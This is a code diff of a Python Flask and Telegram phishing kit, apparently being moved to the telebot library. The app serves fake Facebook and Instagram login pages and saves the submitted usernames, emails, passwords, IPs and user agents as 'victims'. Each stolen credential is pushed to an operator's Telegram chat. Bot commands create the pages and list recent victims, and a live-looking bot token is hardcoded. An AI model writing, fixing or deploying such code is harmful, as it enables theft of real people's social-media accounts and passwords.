@@ -2,16 +2,15 @@ import os
 import logging
 from flask import Flask, request, render_template_string
 import sqlite3
-from telegram import Bot, Update
-from telegram.ext import Dispatcher, CommandHandler
+import telebot
+from telebot.types import Update
 
 # التوكن والآيدي
 BOT_TOKEN = "8236056575:AAHI0JHvTGdJiu92sDXiv7dbWMJLxvMY_x4"
 ADMIN_ID = "7604667042"
 
 app = Flask(__name__)
-bot = Bot(token=BOT_TOKEN)
-dispatcher = Dispatcher(bot, None, workers=0)
+bot = telebot.TeleBot(BOT_TOKEN)
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -96,10 +95,11 @@ INSTAGRAM_PAGE = """
 """
 
 # أوامر البوت
-def start_command(update, context):
-    user_id = update.effective_user.id
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    user_id = message.from_user.id
     if str(user_id) != ADMIN_ID:
-        update.message.reply_text("❌ غير مصرح لك باستخدام هذا البوت")
+        bot.reply_to(message, "❌ غير مصرح لك باستخدام هذا البوت")
         return
     
     victims_count = get_victims_count()
@@ -121,36 +121,43 @@ def start_command(update, context):
 /stats - الإحصائيات
     """
     
-    update.message.reply_text(welcome_text, parse_mode='Markdown')
+    bot.reply_to(message, welcome_text, parse_mode='Markdown')
 
-def create_facebook_command(update, context):
+@bot.message_handler(commands=['create_facebook'])
+def create_facebook_command(message):
+    user_id = message.from_user.id
+    if str(user_id) != ADMIN_ID:
+        return
+    
     page_url = f"{request.host_url}facebook_login"
     save_page("فيسبوك", page_url)
     
-    bot.send_message(
-        chat_id=ADMIN_ID,
-        text=f"🌐 **صفحة فيسبوك جاهزة:**\n`{page_url}`",
-        parse_mode='Markdown'
-    )
+    bot.reply_to(message, f"🌐 **صفحة فيسبوك جاهزة:**\n`{page_url}`", parse_mode='Markdown')
 
-def create_instagram_command(update, context):
+@bot.message_handler(commands=['create_instagram'])
+def create_instagram_command(message):
+    user_id = message.from_user.id
+    if str(user_id) != ADMIN_ID:
+        return
+    
     page_url = f"{request.host_url}instagram_login"
     save_page("انستغرام", page_url)
     
-    bot.send_message(
-        chat_id=ADMIN_ID,
-        text=f"📸 **صفحة انستغرام جاهزة:**\n`{page_url}`",
-        parse_mode='Markdown'
-    )
+    bot.reply_to(message, f"📸 **صفحة انستغرام جاهزة:**\n`{page_url}`", parse_mode='Markdown')
 
-def victims_command(update, context):
+@bot.message_handler(commands=['victims'])
+def victims_command(message):
+    user_id = message.from_user.id
+    if str(user_id) != ADMIN_ID:
+        return
+    
     victims = get_recent_victims()
     victims_text = "👥 **آخر 5 ضحايا:**\n\n"
     
     for victim in victims:
         victims_text += f"📧 {victim[1]}\n🔑 {victim[2]}\n🕒 {victim[6]}\n\n"
     
-    update.message.reply_text(victims_text, parse_mode='Markdown')
+    bot.reply_to(message, victims_text, parse_mode='Markdown')
 
 # Routes التصيد
 @app.route('/')
@@ -176,8 +183,8 @@ def submit_facebook():
     
     # إرسال إشعار للتليجرام
     bot.send_message(
-        chat_id=ADMIN_ID,
-        text=f"🎯 **ضحية جديدة - فيسبوك**\n\n📧 `{email}`\n🔑 `{password}`\n🌐 `{ip}`",
+        ADMIN_ID,
+        f"🎯 **ضحية جديدة - فيسبوك**\n\n📧 `{email}`\n🔑 `{password}`\n🌐 `{ip}`",
         parse_mode='Markdown'
     )
     
@@ -193,12 +200,23 @@ def submit_instagram():
     save_victim(username, password, ip, user_agent, "انستغرام")
     
     bot.send_message(
-        chat_id=ADMIN_ID,
-        text=f"🎯 **ضحية جديدة - انستغرام**\n\n👤 `{username}`\n🔑 `{password}`\n🌐 `{ip}`",
+        ADMIN_ID,
+        f"🎯 **ضحية جديدة - انستغرام**\n\n👤 `{username}`\n🔑 `{password}`\n🌐 `{ip}`",
         parse_mode='Markdown'
     )
     
     return "تم تسجيل الدخول بنجاح! جاري التوجيه..."
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    try:
+        json_str = request.get_data().decode('UTF-8')
+        update = Update.de_json(json_str)
+        bot.process_new_updates([update])
+        return 'OK'
+    except Exception as e:
+        logger.error(f"Webhook error: {e}")
+        return 'ERROR'
 
 # دوال مساعدة
 def save_victim(email, password, ip, user_agent, page):
@@ -252,22 +270,6 @@ def get_recent_victims():
     victims = cursor.fetchall()
     conn.close()
     return victims
-
-# إضافة handlers
-dispatcher.add_handler(CommandHandler("start", start_command))
-dispatcher.add_handler(CommandHandler("create_facebook", create_facebook_command))
-dispatcher.add_handler(CommandHandler("create_instagram", create_instagram_command))
-dispatcher.add_handler(CommandHandler("victims", victims_command))
-
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    try:
-        update = Update.de_json(request.get_json(), bot)
-        dispatcher.process_update(update)
-        return 'OK'
-    except Exception as e:
-        logger.error(f"Webhook error: {e}")
-        return 'ERROR'
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
